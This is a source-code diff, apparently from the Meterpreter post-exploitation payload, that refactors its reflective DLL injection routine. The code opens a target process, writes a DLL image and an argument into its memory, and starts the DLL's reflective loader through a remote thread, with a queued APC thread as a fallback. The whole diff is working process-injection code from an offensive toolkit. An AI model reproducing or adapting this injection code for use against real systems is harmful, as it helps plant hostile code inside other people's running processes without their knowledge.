@@ -493,12 +493,22 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
  *       will check for this and fail gracefully.
  *
  * Note: This function largely depreciates LoadRemoteLibraryR().
+ * 
+ * @param dwPid The process to inject into.
+ * @param dwDestinationArch The arechitecture of the process to inject into. If this value is PROCESS_ARCH_UNKNOWN, then
+ *        dwMeterpreterArch is used.
+ * @param lpDllBuffer The DLL buffer to inject into the process. The DLL architecture must match the target PID.
+ * @param dwDllLength The length in bytes of the DLL buffer.
+ * @param reflectiveLoader The reflective loader function to call.
+ * @param lpArg The argument to pass to the reflective loader function. See stArgSize for details.
+ * @param stArgSize The size in bytes of lpArg. If this value is non-zero, it specifies the number of bytes that are
+ *        copied into the target process. If this value is zero, then the value of lpArg is passed directly to the
+ *        target and must be set to a valid address within the target process.
  */
-DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, char * cpCommandLine )
+DWORD inject_dll( DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, LPVOID lpArg, SIZE_T stArgSize )
 {
 	DWORD dwResult                 = ERROR_ACCESS_DENIED;
-	DWORD dwNativeArch             = PROCESS_ARCH_UNKNOWN;
-	LPVOID lpRemoteCommandLine     = NULL;
+	LPVOID lpRemoteArg             = NULL;
 	HANDLE hProcess                = NULL;
 	LPVOID lpRemoteLibraryBuffer   = NULL;
 	LPVOID lpReflectiveLoader      = NULL;
@@ -507,7 +517,9 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR ref
 	do
 	{
 		if( !lpDllBuffer || !dwDllLength )
-			BREAK_WITH_ERROR( "[INJECT] inject_dll.  No Dll buffer supplied.", ERROR_INVALID_PARAMETER );
+			BREAK_WITH_ERROR( "[INJECT] inject_dll. No Dll buffer supplied.", ERROR_INVALID_PARAMETER );
+		if (dwDestinationArch == PROCESS_ARCH_UNKNOWN)
+			dwDestinationArch = dwMeterpreterArch;
 
 		// check if the library has a ReflectiveLoader...
 		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer, reflectiveLoader );
@@ -518,15 +530,23 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR ref
 		if( !hProcess )
 			BREAK_ON_ERROR( "[INJECT] inject_dll. OpenProcess failed." ); 
 
-		if( cpCommandLine )
+		if( lpArg )
 		{
-			// alloc some space and write the commandline which we will pass to the injected dll...
-			lpRemoteCommandLine = VirtualAllocEx( hProcess, NULL, strlen(cpCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
-			if( !lpRemoteCommandLine )
-				BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualAllocEx 1 failed" ); 
+			if (stArgSize)
+			{
+				// alloc some space and write the argument which we will pass to the injected dll...
+				lpRemoteArg = VirtualAllocEx(hProcess, NULL, stArgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+				if (!lpRemoteArg)
+					BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");
 
-			if( !WriteProcessMemory( hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine)+1, NULL ) )
-				BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 1 failed" ); 
+				if (!WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
+					BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
+			}
+			else
+			{
+				// if only lpArg is specified, pass it as-is without allocating space for it and copying the contents
+				lpRemoteArg = lpArg;
+			}
 		}
 
 		// alloc memory (RWX) in the host process for the image...
@@ -540,14 +560,14 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR ref
 
 		// add the offset to ReflectiveLoader() to the remote library address...
 		lpReflectiveLoader = (LPVOID)((DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
-	
+
 		// First we try to inject by directly creating a remote thread in the target process
-		if( inject_via_remotethread( NULL, NULL, hProcess, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
+		if( inject_via_remotethread( NULL, NULL, hProcess, dwDestinationArch, lpReflectiveLoader, lpRemoteArg ) != ERROR_SUCCESS )
 		{
 			dprintf( "[INJECT] inject_dll. inject_via_remotethread failed, trying inject_via_apcthread..." );
-			
+
 			// If that fails we can try to migrate via a queued APC in the target process
-			if( inject_via_apcthread( NULL, NULL, hProcess, dwPid, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
+			if( inject_via_apcthread( NULL, NULL, hProcess, dwPid, dwDestinationArch, lpReflectiveLoader, lpRemoteArg ) != ERROR_SUCCESS )
 				BREAK_ON_ERROR( "[INJECT] inject_dll. inject_via_apcthread failed" )
 		}
 
